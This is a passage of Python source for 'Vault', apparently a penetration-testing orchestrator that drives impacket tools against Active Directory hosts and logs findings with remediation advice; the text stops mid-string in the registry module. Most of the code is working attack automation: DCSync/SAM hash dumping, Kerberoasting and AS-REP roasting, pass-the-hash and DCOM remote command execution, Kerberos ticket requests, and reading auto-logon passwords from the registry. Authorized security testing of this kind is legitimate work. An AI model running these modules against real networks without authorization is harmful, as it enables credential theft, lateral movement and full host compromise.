#!/usr/bin/env python3
"""
Vault — Active Directory / SMB credential test orchestrator (impacket).

Token protocol (when CRUCIBLE_MANAGED=1):
  __CRUCIBLE_LOG__:     <message>
  __CRUCIBLE_ERR__:     <message>
  __CRUCIBLE_STATUS__:  <json>
  __CRUCIBLE_FINDING__: <json>
"""
from __future__ import annotations

import argparse
import csv
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

VERSION = Path(__file__).resolve().parent.joinpath("VERSION").read_text().strip()

try:
    if "/opt/pr0t31n/shared" not in sys.path:
        sys.path.insert(0, "/opt/pr0t31n/shared")
    import pr0t31n_schema as _us
except ImportError:
    _us = None

try:
    import pr0t31n_tool_runner as _ur
except ImportError:
    _ur = None

try:
    import pr0t31n_event_log as _el
except ImportError:
    _el = None

_MANAGED = os.environ.get("CRUCIBLE_MANAGED", "") == "1"
_findings: list = []

_RUN_DIR: Optional[Path] = None
_RUNLOG = None

_CSV_FIELDS = ["id", "tool", "title", "datetime", "ip", "port", "hostname",
               "risk", "command", "description", "output_file", "affected",
               "cves", "service", "catalogue_id", "remediation", "sources"]

_MODULE_GROUPS = {
    "all": None,
    "credential": {"secretsdump", "kerberoast", "asreproast", "smb_relay"},
    "enum": {"ldap_enum", "sid_enum", "sam_dump", "delegation", "spn_scan"},
    "exec": {"pth_exec", "dcom_exec", "tgt_request", "service_ticket",
             "share_enum", "reg_secrets", "gpp_passwords"},
    "relay": {"ntlm_relay", "password_spray", "dpapi"},
}

_ALL_MODULES = (
    _MODULE_GROUPS["credential"] | _MODULE_GROUPS["enum"]
    | _MODULE_GROUPS["exec"] | _MODULE_GROUPS["relay"]
)


def _rel(p) -> str:
    if not p:
        return ""
    if _us is not None and _RUN_DIR is not None:
        try:
            r = _us.to_relative_output_file(p, str(_RUN_DIR))
            if r:
                return r
        except Exception:
            pass
    return str(p)


def _tok(token: str, msg: str) -> None:
    if _MANAGED:
        print(f"{token}:{msg}", flush=True)
    else:
        print(msg, flush=True)


def log(msg: str) -> None:
    _tok("__CRUCIBLE_LOG__", msg)
    if _RUNLOG is not None:
        try: _RUNLOG.info(msg)
        except Exception: pass


def err(msg: str) -> None:
    _tok("__CRUCIBLE_ERR__", msg)
    if _RUNLOG is not None:
        try: _RUNLOG.error(msg)
        except Exception: pass


def status(phase: str, label: str, state: str, step: str = "") -> None:
    _tok("__CRUCIBLE_STATUS__",
         json.dumps({"phase": phase, "label": label, "state": state, "step": step}))
    if _RUNLOG is not None:
        try: _RUNLOG.event(f"{phase}: {label} [{state}]")
        except Exception: pass


def finding(*, title: str, severity: str, description: str, ip: str = "",
             port: int = 0, data: dict | None = None,
             output_file: str = "") -> None:
    of_rel = ""
    if output_file:
        parts = [output_file]
        logp = str(output_file) + ".log"
        if os.path.exists(logp):
            parts.append(logp)
        of_rel = ",".join(r for r in (_rel(p) for p in parts) if r)
    if _us is not None:
        rec = _us.make_finding(
            tool="vault", title=title, risk=severity.upper(),
            description=description, ip=ip, port=port,
            command=(data or {}).get("command", ""),
            output_file=of_rel,
            affected=(data or {}).get("affected", ""),
            remediation=(data or {}).get("remediation", ""),
            sources="vault", catalogue_id=(data or {}).get("catalogue_id", ""),
        )
    else:
        rec = {
            "id": str(uuid.uuid4()),
            "tool": "vault",
            "title": title,
            "risk": severity.upper(),
            "description": description,
            "ip": ip, "port": port,
            "datetime": datetime.now(timezone.utc).isoformat(),
            "output_file": of_rel,
            "data": data or {},
        }
    _findings.append(rec)
    _tok("__CRUCIBLE_FINDING__", json.dumps(rec))
    _flush_findings()


def _flush_findings():
    if _RUN_DIR is None:
        return
    try:
        if _us is not None:
            out = [_us.augment_finding(dict(f), tool="vault") for f in _findings]
            _us.atomic_write_json(_RUN_DIR / "findings.json", out)
        else:
            (_RUN_DIR / "findings.json").write_text(
                json.dumps(_findings, indent=2), encoding="utf-8")
    except Exception as exc:
        err(f"findings.json flush failed: {exc}")


# ── Helpers ──────────────────────────────────────────────────────────────────

def _which_impacket(name: str) -> Optional[str]:
    for candidate in (name, f"impacket-{name}", f"{name}.py"):
        p = shutil.which(candidate)
        if p:
            return p
    return None


def _run_capture(cmd: list, output_file: Path, timeout: int = 300,
                 env_override: dict | None = None) -> str:
    try:
        run_env = None
        if env_override:
            run_env = {**os.environ, **env_override}
        if _ur is not None:
            cp = _ur.run_tool(cmd, output_file=str(output_file),
                                timeout=timeout, tool_name=Path(cmd[0]).name,
                                env=run_env,
                                errors_log=(str(_RUN_DIR / "errors.log")
                                            if _RUN_DIR is not None else None))
        else:
            cp = subprocess.run(cmd, capture_output=True, text=True,
                                timeout=timeout, env=run_env)
        raw = (cp.stdout or "") + (cp.stderr or "")
        output_file.write_text(raw, encoding="utf-8")
        return raw
    except Exception as exc:
        err(f"{Path(cmd[0]).name} failed: {exc}")
        try:
            output_file.write_text(f"ERROR: {exc}", encoding="utf-8")
        except Exception:
            pass
        return ""


def _run_capture_stdin(cmd: list, stdin_text: str, output_file: Path,
                       timeout: int = 300,
                       env_override: dict | None = None) -> str:
    try:
        run_env = None
        if env_override:
            run_env = {**os.environ, **env_override}
        cp = subprocess.run(cmd, capture_output=True, text=True,
                            input=stdin_text, timeout=timeout, env=run_env)
        raw = (cp.stdout or "") + (cp.stderr or "")
        output_file.write_text(raw, encoding="utf-8")
        if _ur is not None and _RUN_DIR is not None:
            try:
                _ur.write_tool_log(
                    cmd=cmd, started=datetime.now(timezone.utc),
                    ended=datetime.now(timezone.utc),
                    exit_code=cp.returncode, stdout=cp.stdout or "",
                    stderr=cp.stderr or "", tool_name=Path(cmd[0]).name,
                    output_file=str(output_file),
                    errors_log=str(_RUN_DIR / "errors.log"))
            except Exception:
                pass
        return raw
    except Exception as exc:
        err(f"{Path(cmd[0]).name} failed: {exc}")
        try:
            output_file.write_text(f"ERROR: {exc}", encoding="utf-8")
        except Exception:
            pass
        return ""


def _build_auth_string(target: str, user: str, password: str, domain: str,
                       hashes: str = "") -> str:
    prefix = f"{domain}/{user}" if domain else user
    if hashes:
        return f"{prefix}@{target}"
    return f"{prefix}:{password}@{target}"


def _build_auth_args(hashes: str = "", ccache: str = "") -> list:
    args = []
    if ccache:
        args += ["-k", "-no-pass"]
    elif hashes:
        args += ["-hashes", hashes]
    return args


def _build_env(ccache: str = "") -> dict | None:
    if ccache:
        return {"KRB5CCNAME": ccache}
    return None


# ── Credential Modules (B1) ─────────────────────────────────────────────────

def mod_secretsdump(target: str, user: str, password: str, domain: str,
                     output_dir: Path, hashes: str = "", ccache: str = "",
                     timeout: int = 900) -> None:
    status("secretsdump", "secretsdump (DCSync / SAM)", "running")
    bin_path = _which_impacket("secretsdump")
    if not bin_path:
        err("impacket-secretsdump not found — install impacket")
        status("secretsdump", "secretsdump (DCSync / SAM)", "skipped")
        return
    out_file = output_dir / "secretsdump.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)
    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    if re.search(r"^[A-Za-z0-9_.-]+:[0-9]+:[0-9a-f]+:[0-9a-f]+:::", raw, re.M):
        n = len(re.findall(r"^[A-Za-z0-9_.-]+:[0-9]+:[0-9a-f]+:[0-9a-f]+:::", raw, re.M))
        finding(title=f"Active Directory credentials dumped via DCSync/SAM ({n} accounts)",
                 severity="CRITICAL", ip=target, port=445,
                 description=(f"secretsdump retrieved {n} NTLM hash(es) from {target}. "
                               "Any of these can be used for pass-the-hash lateral movement."),
                 data={"catalogue_id": "VAULT-AD-001",
                       "affected": target,
                       "remediation": "Audit privileged accounts; rotate krbtgt twice; enable LSA Protection."},
                 output_file=str(out_file))
    status("secretsdump", "secretsdump (DCSync / SAM)", "complete")


def mod_kerberoast(target: str, user: str, password: str, domain: str,
                    output_dir: Path, hashes: str = "", ccache: str = "",
                    timeout: int = 300) -> None:
    status("kerberoast", "Kerberoasting (GetUserSPNs)", "running")
    if not domain:
        err("kerberoast requires --domain; skipping")
        status("kerberoast", "Kerberoasting (GetUserSPNs)", "skipped")
        return
    bin_path = _which_impacket("GetUserSPNs")
    if not bin_path:
        err("impacket-GetUserSPNs not found — install impacket")
        status("kerberoast", "Kerberoasting (GetUserSPNs)", "skipped")
        return
    out_file = output_dir / "kerberoast.txt"
    auth_str = f"{domain}/{user}:{password}" if not hashes and not ccache else f"{domain}/{user}"
    cmd = [bin_path, "-request", "-dc-ip", target] + _build_auth_args(hashes, ccache)
    cmd += [auth_str, "-outputfile", str(out_file)]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    tgs_hashes = re.findall(r"\$krb5tgs\$\d+\$.*", raw)
    if tgs_hashes:
        finding(title=f"Service tickets captured for Kerberoasting ({len(tgs_hashes)} hash(es))",
                 severity="HIGH", ip=target, port=88,
                 description=("GetUserSPNs requested service tickets for accounts with "
                               "SPNs.  The resulting TGS-REP hashes can be cracked offline "
                               "to recover service-account passwords."),
                 data={"catalogue_id": "VAULT-AD-002", "affected": target,
                       "remediation": "Use 30+ character random service-account passwords; prefer gMSAs."},
                 output_file=str(out_file))
    status("kerberoast", "Kerberoasting (GetUserSPNs)", "complete")


def mod_asreproast(target: str, user: str, password: str, domain: str,
                    output_dir: Path, users_file: Optional[Path] = None,
                    hashes: str = "", ccache: str = "",
                    timeout: int = 300) -> None:
    status("asreproast", "AS-REP Roasting (GetNPUsers)", "running")
    if not domain:
        err("asreproast requires --domain; skipping")
        status("asreproast", "AS-REP Roasting (GetNPUsers)", "skipped")
        return
    bin_path = _which_impacket("GetNPUsers")
    if not bin_path:
        err("impacket-GetNPUsers not found — install impacket")
        status("asreproast", "AS-REP Roasting (GetNPUsers)", "skipped")
        return
    out_file = output_dir / "asreproast.txt"
    cmd = [bin_path, "-no-pass", "-dc-ip", target,
            "-format", "hashcat", f"{domain}/"]
    if users_file:
        cmd += ["-usersfile", str(users_file)]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    hashes_found = re.findall(r"\$krb5asrep\$\d+\$.*", raw)
    if hashes_found:
        finding(title=f"AS-REP roastable accounts found ({len(hashes_found)} hash(es))",
                 severity="HIGH", ip=target, port=88,
                 description=("Accounts have 'Do not require Kerberos preauthentication' set; "
                               "AS-REP hashes can be cracked offline without authenticating."),
                 data={"catalogue_id": "VAULT-AD-003", "affected": target,
                       "remediation": "Disable DONT_REQUIRE_PREAUTH on every account."},
                 output_file=str(out_file))
    status("asreproast", "AS-REP Roasting (GetNPUsers)", "complete")


def mod_smb_relay(target: str, output_dir: Path, timeout: int = 60) -> None:
    status("smb_relay", "SMB signing inspection", "running")
    enum_bin = _which_impacket("rpcdump") or shutil.which("rpcdump.py")
    out_file = output_dir / "smb_signing.txt"
    raw = ""
    if enum_bin:
        raw = _run_capture([enum_bin, f"{target}"], out_file, timeout=timeout)
    if re.search(r"[Ss]igning required\s*[:=]\s*[Ff]alse|message_signing.*disabled",
                  raw):
        finding(title=f"SMB signing not required on {target}",
                 severity="MEDIUM", ip=target, port=445,
                 description=("SMB signing is not required; the host is a candidate "
                               "for NTLM relay attacks (impacket ntlmrelayx)."),
                 data={"catalogue_id": "VAULT-AD-004", "affected": target,
                       "remediation": "Set 'Require security signature' in Group Policy."},
                 output_file=str(out_file))
    status("smb_relay", "SMB signing inspection", "complete")


# ── Enumeration Modules (B2) ────────────────────────────────────────────────

def mod_ldap_enum(target: str, user: str, password: str, domain: str,
                   output_dir: Path, hashes: str = "", ccache: str = "",
                   timeout: int = 300) -> None:
    status("ldap_enum", "LDAP enumeration (GetADUsers + ldapdomaindump)", "running")
    if not domain:
        err("ldap_enum requires --domain; skipping")
        status("ldap_enum", "LDAP enumeration", "skipped")
        return

    enum_dir = output_dir / "ldap_dump"
    enum_dir.mkdir(parents=True, exist_ok=True)

    bin_getadusers = _which_impacket("GetADUsers")
    if bin_getadusers:
        out_file = enum_dir / "getadusers.txt"
        auth_str = f"{domain}/{user}:{password}" if not hashes and not ccache else f"{domain}/{user}"
        cmd = [bin_getadusers, "-all", "-dc-ip", target] + _build_auth_args(hashes, ccache)
        cmd += [auth_str]
        raw = _run_capture(cmd, out_file, timeout=timeout,
                           env_override=_build_env(ccache))
        user_lines = [l for l in raw.splitlines()
                      if l.strip() and not l.startswith("Impacket")
                      and not l.startswith("Name") and not l.startswith("-")]
        if user_lines:
            finding(title=f"Domain users enumerated via LDAP ({len(user_lines)} accounts)",
                     severity="INFO", ip=target, port=389,
                     description=(f"GetADUsers enumerated {len(user_lines)} domain user "
                                   f"accounts from {target} via LDAP."),
                     data={"catalogue_id": "VT-ENUM-001",
                           "affected": domain,
                           "remediation": "Restrict anonymous LDAP access; implement LDAP signing."},
                     output_file=str(out_file))
    else:
        err("GetADUsers.py not found — skipping LDAP user enumeration")

    bin_ldapdump = shutil.which("ldapdomaindump")
    if bin_ldapdump:
        auth_str = f"{domain}\\{user}"
        cmd = [bin_ldapdump, "-u", auth_str, "-p", password if not hashes else ""]
        if hashes:
            cmd += ["--hashes", hashes]
        cmd += ["-o", str(enum_dir), f"ldap://{target}"]
        _run_capture(cmd, enum_dir / "ldapdomaindump.txt", timeout=timeout,
                     env_override=_build_env(ccache))
        dumped = list(enum_dir.glob("domain_*"))
        if dumped:
            log(f"ldapdomaindump produced {len(dumped)} files in {enum_dir}")
    else:
        log("ldapdomaindump not found — install with: pip3 install ldapdomaindump")

    status("ldap_enum", "LDAP enumeration", "complete")


def mod_sid_enum(target: str, user: str, password: str, domain: str,
                  output_dir: Path, hashes: str = "", ccache: str = "",
                  timeout: int = 300) -> None:
    status("sid_enum", "SID brute-force (lookupsid)", "running")
    bin_path = _which_impacket("lookupsid")
    if not bin_path:
        err("lookupsid.py not found — install impacket")
        status("sid_enum", "SID brute-force", "skipped")
        return
    out_file = output_dir / "lookupsid.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)
    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth, "4000"]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    sid_entries = re.findall(r"(\d+): .+ \(SidTypeUser\)", raw)
    if sid_entries:
        finding(title=f"Domain users enumerated via SID brute-force ({len(sid_entries)} accounts)",
                 severity="INFO", ip=target, port=445,
                 description=(f"lookupsid brute-forced {len(sid_entries)} user SIDs from "
                               f"{target}. This works even when LDAP enumeration is restricted."),
                 data={"catalogue_id": "VT-ENUM-002",
                       "affected": target,
                       "remediation": "Restrict anonymous access to the SAM and LSA."},
                 output_file=str(out_file))
    status("sid_enum", "SID brute-force", "complete")


def mod_sam_dump(target: str, user: str, password: str, domain: str,
                  output_dir: Path, hashes: str = "", ccache: str = "",
                  timeout: int = 300) -> None:
    status("sam_dump", "SAM Remote Interface (samrdump)", "running")
    bin_path = _which_impacket("samrdump")
    if not bin_path:
        err("samrdump.py not found — install impacket")
        status("sam_dump", "SAM Remote Interface", "skipped")
        return
    out_file = output_dir / "samrdump.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)
    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))

    pw_policy = re.search(r"[Mm]inimum [Pp]assword [Ll]ength:\s*(\d+)", raw)
    lockout = re.search(r"[Aa]ccount [Ll]ockout [Tt]hreshold:\s*(\d+)", raw)

    if pw_policy and int(pw_policy.group(1)) < 8:
        finding(title=f"Weak password policy: minimum length {pw_policy.group(1)} characters",
                 severity="MEDIUM", ip=target, port=445,
                 description=(f"samrdump reports minimum password length of "
                               f"{pw_policy.group(1)} characters on {target}. "
                               "Industry standard minimum is 14 characters."),
                 data={"catalogue_id": "VT-ENUM-003",
                       "affected": target,
                       "remediation": "Set minimum password length to 14+ characters via Group Policy."},
                 output_file=str(out_file))

    if lockout and int(lockout.group(1)) == 0:
        finding(title=f"No account lockout threshold configured on {target}",
                 severity="MEDIUM", ip=target, port=445,
                 description=("samrdump reports no account lockout threshold. "
                               "This allows unlimited brute-force attempts against domain accounts."),
                 data={"catalogue_id": "VT-ENUM-003",
                       "affected": target,
                       "remediation": "Configure account lockout threshold (5-10 attempts) via Group Policy."},
                 output_file=str(out_file))

    users = re.findall(r"Found user: (.+),", raw)
    if users:
        log(f"samrdump enumerated {len(users)} user(s) from {target}")

    status("sam_dump", "SAM Remote Interface", "complete")


def mod_delegation(target: str, user: str, password: str, domain: str,
                    output_dir: Path, hashes: str = "", ccache: str = "",
                    timeout: int = 300) -> None:
    status("delegation", "Delegation enumeration (findDelegation)", "running")
    if not domain:
        err("delegation requires --domain; skipping")
        status("delegation", "Delegation enumeration", "skipped")
        return
    bin_path = _which_impacket("findDelegation")
    if not bin_path:
        err("findDelegation.py not found — install impacket")
        status("delegation", "Delegation enumeration", "skipped")
        return
    out_file = output_dir / "delegation.txt"
    auth_str = f"{domain}/{user}:{password}" if not hashes and not ccache else f"{domain}/{user}"
    cmd = [bin_path, "-dc-ip", target] + _build_auth_args(hashes, ccache)
    cmd += [auth_str]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))

    unconstrained = re.findall(r"(\S+)\s+\S+\s+UNCONSTRAINED", raw, re.I)
    constrained = re.findall(r"(\S+)\s+\S+\s+CONSTRAINED", raw, re.I)
    rbcd = re.findall(r"(\S+)\s+\S+\s+RBCD", raw, re.I)

    if unconstrained:
        finding(title=f"Unconstrained delegation found ({len(unconstrained)} account(s))",
                 severity="HIGH", ip=target, port=389,
                 description=(f"findDelegation identified {len(unconstrained)} account(s) "
                               f"with unconstrained delegation: {', '.join(unconstrained[:5])}. "
                               "An attacker who compromises these accounts can impersonate any "
                               "domain user to any service."),
                 data={"catalogue_id": "VT-DELEG-001",
                       "affected": ", ".join(unconstrained),
                       "remediation": "Remove unconstrained delegation; use constrained delegation with protocol transition instead."},
                 output_file=str(out_file))

    if constrained:
        finding(title=f"Constrained delegation found ({len(constrained)} account(s))",
                 severity="MEDIUM", ip=target, port=389,
                 description=(f"findDelegation identified {len(constrained)} account(s) "
                               f"with constrained delegation: {', '.join(constrained[:5])}. "
                               "Review target services to ensure delegation scope is appropriate."),
                 data={"catalogue_id": "VT-DELEG-001",
                       "affected": ", ".join(constrained),
                       "remediation": "Audit constrained delegation targets; remove unnecessary delegations."},
                 output_file=str(out_file))

    if rbcd:
        finding(title=f"Resource-Based Constrained Delegation found ({len(rbcd)} account(s))",
                 severity="MEDIUM", ip=target, port=389,
                 description=(f"findDelegation identified {len(rbcd)} account(s) with "
                               f"RBCD configured: {', '.join(rbcd[:5])}. RBCD can be abused "
                               "for privilege escalation if a low-privilege account controls the "
                               "msDS-AllowedToActOnBehalfOfOtherIdentity attribute."),
                 data={"catalogue_id": "VT-DELEG-001",
                       "affected": ", ".join(rbcd),
                       "remediation": "Audit RBCD configurations; ensure only authorized accounts have write access to the attribute."},
                 output_file=str(out_file))

    status("delegation", "Delegation enumeration", "complete")


def mod_spn_scan(target: str, user: str, password: str, domain: str,
                  output_dir: Path, hashes: str = "", ccache: str = "",
                  timeout: int = 300) -> None:
    status("spn_scan", "SPN enumeration (GetUserSPNs list mode)", "running")
    if not domain:
        err("spn_scan requires --domain; skipping")
        status("spn_scan", "SPN enumeration", "skipped")
        return
    bin_path = _which_impacket("GetUserSPNs")
    if not bin_path:
        err("impacket-GetUserSPNs not found — install impacket")
        status("spn_scan", "SPN enumeration", "skipped")
        return
    out_file = output_dir / "spn_scan.txt"
    auth_str = f"{domain}/{user}:{password}" if not hashes and not ccache else f"{domain}/{user}"
    cmd = [bin_path, "-dc-ip", target] + _build_auth_args(hashes, ccache)
    cmd += [auth_str]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    spn_lines = [l for l in raw.splitlines()
                 if l.strip() and "/" in l and not l.startswith("Impacket")
                 and not l.startswith("ServicePrincipalName") and not l.startswith("-")]
    if spn_lines:
        finding(title=f"Service Principal Names enumerated ({len(spn_lines)} SPN(s))",
                 severity="INFO", ip=target, port=88,
                 description=(f"GetUserSPNs (list mode) enumerated {len(spn_lines)} "
                               f"SPNs from {target}. This is an inventory of service "
                               "accounts — each is a potential Kerberoasting target."),
                 data={"catalogue_id": "VT-ENUM-004",
                       "affected": domain,
                       "remediation": "Remove unnecessary SPNs from user accounts; use gMSAs for service accounts."},
                 output_file=str(out_file))
    status("spn_scan", "SPN enumeration", "complete")


# ── Exploitation Validation Modules (B3) ─────────────────────────────────────

def mod_pth_exec(target: str, user: str, password: str, domain: str,
                  output_dir: Path, hashes: str = "", ccache: str = "",
                  timeout: int = 120) -> None:
    status("pth_exec", "Pass-the-Hash execution validation", "running")
    if not hashes and not ccache:
        log("pth_exec requires --hashes or --ccache; skipping")
        status("pth_exec", "Pass-the-Hash execution validation", "skipped")
        return

    out_file = output_dir / "pth_exec.txt"
    exec_tools = [
        ("wmiexec", "wmiexec"),
        ("psexec", "psexec"),
        ("smbexec", "smbexec"),
    ]
    succeeded_via = None
    combined_raw = ""
    for label, tool_name in exec_tools:
        bin_path = _which_impacket(tool_name)
        if not bin_path:
            combined_raw += f"[{label}] not found on PATH\n"
            continue
        auth = _build_auth_string(target, user, password, domain, hashes)
        cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth, "whoami"]
        raw = _run_capture(cmd, out_file, timeout=timeout,
                           env_override=_build_env(ccache))
        combined_raw += f"[{label}]\n{raw}\n"
        if re.search(r"nt authority|\\", raw, re.I) and "error" not in raw.lower()[:50]:
            succeeded_via = label
            break

    out_file.write_text(combined_raw, encoding="utf-8")

    if succeeded_via:
        finding(title=f"Remote code execution via Pass-the-Hash ({succeeded_via}) on {target}",
                 severity="CRITICAL", ip=target, port=445,
                 description=(f"Captured NTLM hashes were used to execute 'whoami' on {target} "
                               f"via {succeeded_via}. This proves the hashes grant administrative "
                               "remote code execution — full host compromise is confirmed."),
                 data={"catalogue_id": "VT-EXEC-001",
                       "affected": target,
                       "remediation": "Rotate compromised credentials immediately. Enable LSA Protection. "
                                      "Restrict local admin reuse across hosts (LAPS). Implement Credential Guard."},
                 output_file=str(out_file))
    status("pth_exec", "Pass-the-Hash execution validation", "complete")


def mod_dcom_exec(target: str, user: str, password: str, domain: str,
                   output_dir: Path, hashes: str = "", ccache: str = "",
                   timeout: int = 120) -> None:
    status("dcom_exec", "DCOM execution validation", "running")
    bin_path = _which_impacket("dcomexec")
    if not bin_path:
        err("dcomexec.py not found — install impacket")
        status("dcom_exec", "DCOM execution validation", "skipped")
        return
    out_file = output_dir / "dcom_exec.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)
    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth, "whoami"]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    if re.search(r"nt authority|\\", raw, re.I) and "error" not in raw.lower()[:50]:
        finding(title=f"Remote code execution via DCOM on {target}",
                 severity="CRITICAL", ip=target, port=135,
                 description=(f"dcomexec.py executed 'whoami' on {target} via DCOM. "
                               "This is an alternative lateral movement vector that bypasses "
                               "SMB-based detections."),
                 data={"catalogue_id": "VT-EXEC-002",
                       "affected": target,
                       "remediation": "Restrict DCOM permissions via dcomcnfg. Block RPC (135) + dynamic ports at network level where not needed. Rotate compromised credentials."},
                 output_file=str(out_file))
    status("dcom_exec", "DCOM execution validation", "complete")


def mod_tgt_request(target: str, user: str, password: str, domain: str,
                     output_dir: Path, hashes: str = "", ccache: str = "",
                     timeout: int = 120) -> None:
    status("tgt_request", "TGT request (getTGT)", "running")
    if not domain:
        err("tgt_request requires --domain; skipping")
        status("tgt_request", "TGT request (getTGT)", "skipped")
        return
    bin_path = _which_impacket("getTGT")
    if not bin_path:
        err("getTGT.py not found — install impacket")
        status("tgt_request", "TGT request (getTGT)", "skipped")
        return
    out_file = output_dir / "tgt_request.txt"
    ccache_out = output_dir / f"{user}.ccache"
    auth_str = f"{domain}/{user}:{password}" if not hashes else f"{domain}/{user}"
    cmd = [bin_path, "-dc-ip", target] + _build_auth_args(hashes, ccache)
    cmd += [auth_str]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    if re.search(r"Saving ticket in|\.ccache", raw):
        finding(title=f"Valid TGT obtained for {domain}/{user}",
                 severity="HIGH", ip=target, port=88,
                 description=(f"getTGT.py successfully obtained a Ticket Granting Ticket for "
                               f"{domain}/{user} from {target}. This proves the supplied credentials "
                               "are valid and can be used for further Kerberos-based attacks."),
                 data={"catalogue_id": "VT-KERB-001",
                       "affected": f"{domain}/{user}",
                       "remediation": "Rotate the compromised account's password. Review account permissions and group memberships."},
                 output_file=str(out_file))
    status("tgt_request", "TGT request (getTGT)", "complete")


def mod_service_ticket(target: str, user: str, password: str, domain: str,
                        output_dir: Path, hashes: str = "", ccache: str = "",
                        timeout: int = 120, spn: str = "") -> None:
    status("service_ticket", "Service ticket request (getST)", "running")
    if not spn:
        log("service_ticket requires --spn; skipping")
        status("service_ticket", "Service ticket request (getST)", "skipped")
        return
    if not domain:
        err("service_ticket requires --domain; skipping")
        status("service_ticket", "Service ticket request (getST)", "skipped")
        return
    bin_path = _which_impacket("getST")
    if not bin_path:
        err("getST.py not found — install impacket")
        status("service_ticket", "Service ticket request (getST)", "skipped")
        return
    out_file = output_dir / "service_ticket.txt"
    auth_str = f"{domain}/{user}:{password}" if not hashes else f"{domain}/{user}"
    cmd = [bin_path, "-dc-ip", target, "-spn", spn] + _build_auth_args(hashes, ccache)
    cmd += [auth_str]
    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))
    if re.search(r"Saving ticket in|\.ccache", raw):
        finding(title=f"Service ticket obtained for SPN {spn}",
                 severity="HIGH", ip=target, port=88,
                 description=(f"getST.py obtained a service ticket for {spn} as {domain}/{user}. "
                               "This proves authenticated access to the target service."),
                 data={"catalogue_id": "VT-KERB-002",
                       "affected": spn,
                       "remediation": "Audit the SPN's service account permissions. Rotate the account password if compromised."},
                 output_file=str(out_file))
    status("service_ticket", "Service ticket request (getST)", "complete")


def mod_share_enum(target: str, user: str, password: str, domain: str,
                    output_dir: Path, hashes: str = "", ccache: str = "",
                    timeout: int = 300) -> None:
    status("share_enum", "Authenticated share enumeration (smbclient)", "running")
    bin_path = _which_impacket("smbclient")
    if not bin_path:
        err("smbclient.py not found — install impacket")
        status("share_enum", "Authenticated share enumeration", "skipped")
        return
    out_file = output_dir / "share_enum.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)
    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth]
    raw = _run_capture_stdin(cmd, "shares\nexit\n", out_file, timeout=timeout,
                              env_override=_build_env(ccache))

    _SENSITIVE_SHARES = {"ADMIN$", "C$", "SYSVOL", "NETLOGON"}
    share_lines = re.findall(r"^\s*(\S+)\s+.*(?:READ|WRITE|FULL)", raw, re.M | re.I)
    sensitive_writable = []
    all_readable = []
    for line in raw.splitlines():
        m = re.match(r"^\s*(\S+)\s+.*", line)
        if not m:
            continue
        share_name = m.group(1)
        if re.search(r"READ|FULL", line, re.I):
            all_readable.append(share_name)
        if share_name in _SENSITIVE_SHARES and re.search(r"WRITE|FULL", line, re.I):
            sensitive_writable.append(share_name)

    if sensitive_writable:
        finding(title=f"Write access to sensitive shares on {target}: {', '.join(sensitive_writable)}",
                 severity="HIGH", ip=target, port=445,
                 description=(f"Authenticated share enumeration found write access to "
                               f"sensitive shares: {', '.join(sensitive_writable)}. "
                               "Write access to ADMIN$/C$ typically means administrative "
                               "control of the host."),
                 data={"catalogue_id": "VT-SMB-001",
                       "affected": target,
                       "remediation": "Review share permissions. Remove unnecessary write access to administrative shares. Implement least-privilege access."},
                 output_file=str(out_file))
    elif all_readable:
        finding(title=f"Authenticated share access on {target} ({len(all_readable)} share(s))",
                 severity="MEDIUM", ip=target, port=445,
                 description=(f"Authenticated share enumeration found read access to "
                               f"{len(all_readable)} share(s): {', '.join(all_readable[:10])}. "
                               "Review for sensitive data exposure."),
                 data={"catalogue_id": "VT-SMB-001",
                       "affected": target,
                       "remediation": "Audit share contents for sensitive data. Implement least-privilege share permissions."},
                 output_file=str(out_file))

    status("share_enum", "Authenticated share enumeration", "complete")


def mod_reg_secrets(target: str, user: str, password: str, domain: str,
                     output_dir: Path, hashes: str = "", ccache: str = "",
                     timeout: int = 120) -> None:
    status("reg_secrets", "Remote registry secrets (reg.py)", "running")
    bin_path = _which_impacket("reg")
    if not bin_path:
        err("reg.py not found — install impacket")
        status("reg_secrets", "Remote registry secrets", "skipped")
        return
    out_file = output_dir / "reg_secrets.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)

    winlogon_key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    values_to_check = ["DefaultUserName", "DefaultPassword", "AutoAdminLogon"]
    combined_raw = ""
    autologon_user = ""
    autologon_pass = ""

    for val in values_to_check:
        cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth, "query",
               "-keyName", winlogon_key, "-v", val]
        raw = _run_capture(cmd, out_file, timeout=timeout,
                           env_override=_build_env(ccache))
        combined_raw += f"[{val}]\n{raw}\n"
        if val == "DefaultUserName":
            m = re.search(r"REG_SZ\s+(.+)", raw)
            if m:
                autologon_user = m.group(1).strip()
        elif val == "DefaultPassword":
            m = re.search(r"REG_SZ\s+(.+)", raw)
            if m:
                autologon_pass = m.group(1).strip()

    out_file.write_text(combined_raw, encoding="utf-8")

    if autologon_user and autologon_pass:
        finding(title=f"Auto-logon credentials found in registry on {target}",
                 severity="HIGH", ip=target, port=445,
                 description=(f"Remote registry query found auto-logon credentials stored in "
